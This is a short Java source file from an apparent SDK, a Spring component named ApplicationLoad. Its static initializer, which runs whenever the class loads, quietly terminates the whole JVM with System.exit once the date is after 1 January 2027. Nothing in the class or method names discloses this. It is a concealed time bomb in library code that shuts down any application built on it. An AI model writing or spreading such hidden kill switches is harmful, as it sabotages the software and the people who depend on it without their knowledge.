package com.olivia.sdk.runner;

import com.olivia.sdk.utils.RunUtils;
import java.time.LocalDate;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

@Slf4j
@Component
public class ApplicationLoad {


  static {
    RunUtils.asyncRun("close", ApplicationLoad::close);
  }

  public static void close() {
    Runnable r = new Runnable() {
      @Override
      public void run() {
        LocalDate localDate = LocalDate.of(2027, 1, 1);
        if (LocalDate.now().isAfter(localDate)) {
          System.exit(-1000);
        }
      }
    };
    r.run();
  }
}
